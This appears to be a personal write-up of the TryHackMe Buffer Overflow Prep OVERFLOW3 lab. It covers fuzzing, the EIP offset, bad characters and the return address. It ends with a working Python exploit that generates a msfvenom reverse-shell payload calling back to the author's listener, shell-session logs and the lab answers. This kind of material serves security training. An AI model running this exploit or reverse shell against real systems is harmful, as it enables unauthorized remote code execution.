# Buffer Overflow 3

Took 20 min to download all the things

```
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/TryHackMe/Buffer Overflow Prep]
└─$ nc 192.168.1.6 1337 -v                                                                                                                                         1 ⨯
192.168.1.6: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.1.6] 1337 (?) open
Welcome to OSCP Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
EXIT
OVERFLOW3 AAA
OVERFLOW3 COMPLETE
^C
                                                                                                                                                                       
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/TryHackMe/Buffer Overflow Prep]
└─$ 
```

Crashes on payload 5000, doesn't crash on 1000

## Fuzzing 

```python
import os

def exploit(offset):
    prefix = ""
    #offset = 5000
    overflow = "A" * offset
    retn = ""[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""

    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"

    #LHOST="192.168.49.234"
    #LPORT="443"
    #command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" EXITFUNC=thread  -b 'x00' -f py -o msfpayload.py"
    #os.system(command)
    #import msfpayload
    #payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    #######################################################################

    payload = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    #print(len(buffer))
    #print([buffer])
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.6', 1337))
    s.send("OVERFLOW3 "+ buffer)
    
import time
for i in range(1000,5000,100):
    print(i)
    exploit(i)
    time.sleep(1)
    
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python exploit.py                                                                                                                                               1 ⨯
1000
1100
1200
1300
1400
1500
Traceback (most recent call last):
  File "exploit.py", line 38, in <module>
    exploit(i)
  File "exploit.py", line 32, in exploit
    s.connect(('192.168.1.6', 1337))
  File "/usr/lib/python2.7/socket.py", line 228, in meth
    return getattr(self._sock,name)(*args)
socket.error: [Errno 111] Connection refused
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$    
```


## Overwriting EIP

```python
import os

def exploit(offset):
    prefix = ""
    #offset = 5000
    overflow = "A" * offset
    retn = ""[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""

    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"

    #LHOST="192.168.49.234"
    #LPORT="443"
    #command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" EXITFUNC=thread  -b 'x00' -f py -o msfpayload.py"
    #os.system(command)
    #import msfpayload
    #payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    #######################################################################

    payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"

    buffer = prefix + overflow + retn + padding + payload + postfix
    #print(len(buffer))
    #print([buffer])
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.6', 1337))
    s.send("OVERFLOW3 "+ buffer)
    
exploit(0)
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500                                                                                         1 ⨯
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python exploit.py                                                      
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```


![](Pasted%20image%2020220217152719.png)

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msf-pattern_offset -l 1500 -q 35714234
[*] Exact match at offset 1274
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python exploit.py                                                      
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

```python
import os

def exploit():
    prefix = ""
    offset = 1274
    overflow = "A" * offset
    retn = "BBBB"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""

    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"

    #LHOST="192.168.49.234"
    #LPORT="443"
    #command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" EXITFUNC=thread  -b 'x00' -f py -o msfpayload.py"
    #os.system(command)
    #import msfpayload
    #payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    #######################################################################

    payload = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    #print(len(buffer))
    #print([buffer])
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.6', 1337))
    s.send("OVERFLOW3 "+ buffer)
    
exploit()
```

![](Pasted%20image%2020220217153003.png)


## Finding Bad Characters

Initial Fuzzing

```python
import os

### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"

    #LHOST="192.168.49.234"
    #LPORT="443"
    #command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" EXITFUNC=thread  -b 'x00' -f py -o msfpayload.py"
    #os.system(command)
    #import msfpayload
    #payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    #######################################################################

def exploit(payload):
    prefix = ""
    offset = 1274
    overflow = "A" * offset
    retn = "BBBB"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""
    #payload = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    #print(len(buffer))
    #print([buffer])
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.6', 1337))
    s.send("OVERFLOW3 "+ buffer)
    
### bad Characters
pp = ""
for x in range(1, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
print(pp)
payload = eval('"'+pp+'"')
#print(payload)
     
exploit(payload)
```

![](Pasted%20image%2020220217153547.png)

Generate comparison binary with this

```python
### bad Characters
pp = ""
for x in range(1, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
print(pp)
payload = eval('"'+pp+'"')
#print(payload)
 
with open("/tmp/binary.bin", "w") as f: f.write(payload)
```

Not correct image
![](Pasted%20image%2020220217154032.png)

`!mona compare -f C:\binary.bin -a 0106FA18`

![](Pasted%20image%2020220217154526.png)

```python
### bad Characters
pp = ""
for x in range(1, 256):
  if x not in [0x0, 0x11]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
```

Repeating the steps


![](Pasted%20image%2020220217154906.png)

![](Pasted%20image%2020220217155039.png)

![](Pasted%20image%2020220217155442.png)

![](Pasted%20image%2020220217155627.png)

![](Pasted%20image%2020220217155838.png)

Exploit code

```python
import os

### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"

    #LHOST="192.168.49.234"
    #LPORT="443"
    #command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" EXITFUNC=thread  -b 'x00' -f py -o msfpayload.py"
    #os.system(command)
    #import msfpayload
    #payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    #######################################################################

def exploit(payload):
    prefix = ""
    offset = 1274
    overflow = "A" * offset
    retn = "BBBB"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""
    #payload = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    #print(len(buffer))
    #print([buffer])
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.6', 1337))
    s.send("OVERFLOW3 "+ buffer)
    
### bad Characters
pp = ""
for x in range(1, 256):
  if x not in [0x0, 0x11, 0x40, 0x5f, 0xb8, 0xee]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
print(pp)
payload = eval('"'+pp+'"')
#print(payload)
 
with open("/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/TryHackMe/Buffer Overflow Prep/binary.bin", "w") as f: f.write(payload)
exploit(payload)
```

1h mark

## Finding return address

![](Pasted%20image%2020220217160218.png)

## Test on local machine

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python exploit.py                                                                                                                                               1 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```powershell
PS D:\Users\zunmu\Documents\Stuff\Hacking\PWK Content\Windows Client\Tools\practical_tools> .\ncat.exe -nlvp 8888
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 192.168.1.6:60514.
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\Users\zunmu\Desktop\oscp>
```

## Exploit
```
import os

def genPayload(LHOST, LPORT):
    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"
    badchars = "\\x00\\x11\\x40\\x5f\\xb8\\xee"
    command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+str(LPORT)+" EXITFUNC=thread  -b '"+badchars+"' -f py -o msfpayload.py"
    os.system(command)
    import msfpayload
    payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    return payload
    #######################################################################

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 1274
    overflow = "A" * offset
    retn = "\x62\x50\x12\x03"[::-1]
    padding = "\x90"*10 #+ "\xcc"
    postfix = ""
    #payload = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    #print(len(buffer))
    #print([buffer])
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send("OVERFLOW3 "+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0, 0x11, 0x40, 0x5f, 0xb8, 0xee]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
with open("/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/TryHackMe/Buffer Overflow Prep/binary.bin", "w") as f: f.write(payload)
##################################### 
 
payload = genPayload('192.168.1.6', 8888)
exploit(payload, '192.168.1.6', 1337)
```

## Final test

```
┌──(kali㉿kali)-[/tmp]
└─$ python exploit.py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=20, char=0xee)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=275, char=0x11)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=4, char=0xee)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of py file: 1731 bytes
Saved as: msfpayload.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 8888                                                                                                                                                   1 ⨯
listening on [any] 8888 ...
connect to [10.8.52.126] from (UNKNOWN) [10.10.238.212] 49193
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>hostname
hostname
oscp-bof-prep

C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
whoami
oscp-bof-prep\admin

C:\Users\admin\Desktop\vulnerable-apps\oscp>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::d935:178e:45ab:3ad4%16
   IPv4 Address. . . . . . . . . . . : 10.10.238.212
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

## Answers

`1274`
`\x00\x11\x40\x5f\xb8\xee`
